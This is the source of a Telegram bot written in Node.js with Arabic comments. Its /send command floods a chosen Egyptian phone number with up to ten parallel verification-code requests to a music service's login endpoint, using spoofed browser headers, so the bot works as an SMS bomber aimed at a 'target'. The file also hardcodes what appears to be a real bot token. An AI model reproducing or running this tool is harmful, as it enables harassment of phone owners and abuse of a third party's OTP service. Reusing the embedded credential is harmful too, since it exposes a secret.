const axios = require('axios');
const crypto = require('crypto');

// ==========================================
// ⚙️ الإعدادات
// ==========================================
const BOT_TOKEN = process.env.TELEGRAM_TOKEN || "8519648833:AAHeg8gNX7P1UZabWKcqeFJv0NAggRzS3Qs"; 
const ADMIN_ID = process.env.ADMIN_ID || "1431886140"; 
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// 🛡️ نظام الذاكرة المؤقتة (Rate Limiting)
const userRequests = new Map();

// ==========================================
// 🛠️ دوال الحماية والمساعدة
// ==========================================
function isRateLimited(userId) {
    const limitCount = 20;           
    const limitTime = 60 * 60 * 1000; 
    const now = Date.now();

    if (!userRequests.has(userId)) userRequests.set(userId, []);
    let timestamps = userRequests.get(userId).filter(t => now - t < limitTime);

    if (timestamps.length >= limitCount) {
        userRequests.set(userId, timestamps); 
        return true; 
    }

    timestamps.push(now);
    userRequests.set(userId, timestamps);
    return false; 
}

// دالة إرسال رسالة واحدة (تستخدم داخل التكرار)
async function sendSingleSMS(number) {
    const url = "https://api.twistmena.com/music/Dlogin/sendCode";
    const headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Referer": "https://www.google.com"
    };
    const payload = { 
        "dial": number, 
        "randomValue": Math.random().toString(36).substring(7) 
    };

    try {
        const res = await axios.post(url, payload, { headers: headers, timeout: 3000 });
        return res.status === 200; // ترجع true لو نجح
    } catch (e) {
        return false; // ترجع false لو فشل
    }
}

// ==========================================
// 🚀 المعالج الرئيسي
// ==========================================
exports.handler = async function(event, context) {
    if (event.httpMethod !== "POST") return { statusCode: 405, body: "Method Not Allowed" };

    try {
        const body = JSON.parse(event.body);
        if (!body.message || !body.message.text) return { statusCode: 200, body: "No Text" };

        const chatId = body.message.chat.id;
        const text = body.message.text.trim();
        const firstName = body.message.from.first_name;

        // استثناء الأدمن من الحظر
        if (String(chatId) !== ADMIN_ID && isRateLimited(chatId)) {
            await axios.post(TELEGRAM_API, { chat_id: chatId, text: "⛔ تجاوزت الحد المسموح (20 طلب/ساعة)." });
            return { statusCode: 200, body: "Rate Limited" };
        }

        let replyText = "";

        // --- أمر الإرسال المتعدد (/send) ---
        if (text.startsWith("/send ")) {
            const parts = text.split(" ");
            
            // التحقق من الصيغة
            if (parts.length !== 3) {
                replyText = "⚠️ **خطأ في الصيغة!**\nاكتب: `/send 01xxxxxxxxx 5`\n(العدد من 1 إلى 10)";
            } else {
                let number = parts[1];
                let count = parseInt(parts[2]);

                // ضبط الرقم المصري
                if (number.startsWith("01")) number = "2" + number;

                // التحقق من العدد (من 1 لـ 10 فقط)
                if (isNaN(count) || count < 1 || count > 10) {
                    replyText = "⛔ **خطأ:** العدد يجب أن يكون بين 1 و 10 فقط.";
                } else {
                    // إرسال رسالة "جاري العمل"
                    await axios.post(TELEGRAM_API, {
                        chat_id: chatId, 
                        text: `⏳ **جاري إرسال ${count} رسائل...**`
                    });

                    // تجهيز الطلبات للإرسال المتوازي (أسرع شيء)
                    const promises = [];
                    for (let i = 0; i < count; i++) {
                        promises.push(sendSingleSMS(number));
                    }

                    // انتظار النتائج
                    const results = await Promise.all(promises);
                    const successCount = results.filter(r => r === true).length;
                    const failCount = count - successCount;

                    replyText = `✅ **تم الانتهاء!**\n\n🎯 **الهدف:** \`${number}\`\n📤 **الناجح:** ${successCount}\n❌ **الفاشل:** ${failCount}`;
                }
            }
        }

        // --- الأوامر القديمة ---
        else if (text === "/start") {
            replyText = `👮‍♂️ **أهلاً بك يا ${firstName}**\n\n🔥 **الأمر الجديد:**\nإرسال رسائل متعددة (ماكس 10):\n\`/send 01xxxxxxxxx 5\``;
        }
        else if (text.startsWith("/ip ")) {
            // (كود IP القديم...)
            replyText = "🌍 خاصية IP (مختصرة للكود)"; 
        }
        else {
             replyText = "💡 **أوامر البوت:**\n1️⃣ فحص رقم: `/check 01xxxxxxxxx`\n2️⃣ إرسال متعدد: `/send 01xxxxxxxxx 5`";
        }

        // إرسال الرد النهائي
        if (replyText) {
            await axios.post(TELEGRAM_API, {
                chat_id: chatId,
                text: replyText,
                parse_mode: "Markdown"
            });
        }

        return { statusCode: 200, body: "OK" };

    } catch (e) {
        console.error(e);
        return { statusCode: 500, body: "Error" };
    }
};
